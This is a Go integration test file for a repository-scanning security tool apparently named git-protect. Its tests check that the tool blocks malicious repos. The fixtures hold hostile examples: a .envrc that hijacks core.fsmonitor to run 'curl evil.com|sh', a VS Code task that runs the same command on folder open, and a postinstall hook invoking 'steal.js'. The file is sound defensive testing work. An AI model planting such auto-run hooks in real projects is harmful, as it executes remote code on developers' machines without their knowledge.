//go:build integration

package main_test

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func buildBinary(t *testing.T) string {
	t.Helper()
	binPath := filepath.Join(t.TempDir(), "git-protect")
	cmd := exec.Command("go", "build", "-o", binPath, "./cmd/git-protect")
	cmd.Dir = "."
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("build failed: %s\n%s", err, out)
	}
	return binPath
}

func initRepo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	run(t, dir, "git", "init")
	run(t, dir, "git", "config", "user.email", "test@test.com")
	run(t, dir, "git", "config", "user.name", "Test")
	return dir
}

func run(t *testing.T, dir string, name string, args ...string) {
	t.Helper()
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("%s %v failed: %s\n%s", name, args, err, out)
	}
}

func TestClone_MaliciousEnvrc(t *testing.T) {
	bin := buildBinary(t)

	repoDir := initRepo(t)
	os.WriteFile(filepath.Join(repoDir, ".envrc"), []byte("export GIT_CONFIG_COUNT=1\nexport GIT_CONFIG_KEY_0=core.fsmonitor\nexport GIT_CONFIG_VALUE_0='curl evil.com|sh'\n"), 0644)
	run(t, repoDir, "git", "add", ".")
	run(t, repoDir, "git", "commit", "-m", "init")

	cloneDir := filepath.Join(t.TempDir(), "cloned")
	cmd := exec.Command(bin, "clone", repoDir, cloneDir)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Error("expected clone to fail for malicious repo with GIT_CONFIG_* in .envrc")
	}

	output := string(out)
	if !strings.Contains(output, "BLOCKED") && !strings.Contains(output, "CRITICAL") {
		t.Errorf("expected BLOCKED or CRITICAL in output, got: %s", output)
	}
}

func TestClone_MaliciousVSCodeTasks(t *testing.T) {
	bin := buildBinary(t)

	repoDir := initRepo(t)
	os.MkdirAll(filepath.Join(repoDir, ".vscode"), 0755)
	os.WriteFile(filepath.Join(repoDir, ".vscode", "tasks.json"), []byte(`{
		"version": "2.0.0",
		"tasks": [{"label": "setup", "type": "shell", "command": "curl evil.com | sh", "runOptions": {"runOn": "folderOpen"}}]
	}`), 0644)
	run(t, repoDir, "git", "add", ".")
	run(t, repoDir, "git", "commit", "-m", "init")

	cloneDir := filepath.Join(t.TempDir(), "cloned")
	cmd := exec.Command(bin, "clone", repoDir, cloneDir)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Error("expected clone to fail for repo with malicious VS Code tasks")
	}

	output := string(out)
	if !strings.Contains(output, "BLOCKED") && !strings.Contains(output, "HIGH") {
		t.Errorf("expected BLOCKED or HIGH in output, got: %s", output)
	}
}

func TestScan_CleanRepo(t *testing.T) {
	bin := buildBinary(t)

	repoDir := initRepo(t)
	os.WriteFile(filepath.Join(repoDir, "main.go"), []byte("package main\n\nfunc main() {}\n"), 0644)
	run(t, repoDir, "git", "add", ".")
	run(t, repoDir, "git", "commit", "-m", "init")

	cmd := exec.Command(bin, "scan", repoDir)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Errorf("scan of clean repo should succeed: %v\n%s", err, out)
	}
	if !strings.Contains(string(out), "No threats found") {
		t.Errorf("expected 'No threats found' in output, got: %s", out)
	}
}

func TestScan_MaliciousPackageJSON(t *testing.T) {
	bin := buildBinary(t)

	repoDir := initRepo(t)
	os.WriteFile(filepath.Join(repoDir, "package.json"), []byte(`{
		"name": "evil",
		"scripts": {"postinstall": "node steal.js"}
	}`), 0644)
	run(t, repoDir, "git", "add", ".")
	run(t, repoDir, "git", "commit", "-m", "init")

	cmd := exec.Command(bin, "scan", repoDir)
	out, err := cmd.CombinedOutput()
	_ = err
	output := string(out)
	if !strings.Contains(output, "MEDIUM") && !strings.Contains(output, "postinstall") {
		t.Errorf("expected MEDIUM finding for postinstall, got: %s", output)
	}
}

func TestScan_JSONOutput(t *testing.T) {
	bin := buildBinary(t)

	repoDir := initRepo(t)
	os.WriteFile(filepath.Join(repoDir, "main.go"), []byte("package main\n"), 0644)
	run(t, repoDir, "git", "add", ".")
	run(t, repoDir, "git", "commit", "-m", "init")

	cmd := exec.Command(bin, "scan", "--json", repoDir)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("scan --json failed: %v\n%s", err, out)
	}

	var parsed map[string]interface{}
	if err := json.Unmarshal(out, &parsed); err != nil {
		t.Fatalf("invalid JSON output: %v\n%s", err, out)
	}

	if _, ok := parsed["findings"]; !ok {
		t.Error("JSON output missing 'findings' field")
	}
	if _, ok := parsed["blocking"]; !ok {
		t.Error("JSON output missing 'blocking' field")
	}
	if _, ok := parsed["count"]; !ok {
		t.Error("JSON output missing 'count' field")
	}
}
